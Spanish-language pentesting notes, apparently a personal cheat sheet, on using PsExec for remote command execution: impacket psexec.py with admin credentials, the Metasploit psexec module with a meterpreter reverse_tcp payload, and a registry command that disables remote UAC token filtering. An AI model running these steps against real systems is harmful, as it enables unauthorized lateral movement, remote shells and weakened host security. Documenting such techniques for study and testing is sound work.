Herramienta creada por microsoft en alternativa a telnet para administrar remotamente redes. Utiliza el protocolo SMB para la autenticación y son necesarias credenciales válidas.
`psexec.py <username>@<ip>`

Ejemplo: psexec.py Administrator@10.10.10.11

## Con metasploit
Usando el módulo: `exploit/smb/psexec`
Set RHOSTS, SMBPASS, SMBUser y para dentro
Si como **payload** quieres consola **meterpreter** cambiar el payload:
**set payload windows/x64/meterpreter/reverse_tcp** y configurar al opciones del payload.
# 🖥️ PsExec - Requisitos de Acceso

## 📌 ¿Se necesita ser administrador?
✅ **Sí, PsExec requiere un usuario con privilegios de administrador** en la máquina remota para ejecutarse correctamente.

## ⚙️ Requisitos para ejecutar PsExec
1. **El usuario debe ser administrador en la máquina remota**  
   - Puede ser un usuario local del grupo **Administrators** o un usuario de **Active Directory** con permisos de administrador.  
   - Si se usa un usuario sin privilegios, PsExec devolverá "Access Denied".

2. **SMB debe estar habilitado en la máquina remota**  
   - PsExec usa **SMB (puerto 445)** para copiar `psexesvc.exe` en `C:\Windows\` del sistema remoto.

3. **El Firewall no debe bloquear SMB**  
   - Si el puerto 445 está bloqueado, PsExec no funcionará.

4. **UAC Remoto puede bloquear cuentas locales**  
   - En Windows Vista/7/10+, si el UAC está activado, es posible recibir "Access Denied".  
   - Para solucionarlo, en la máquina remota:
   ```powershell
   reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
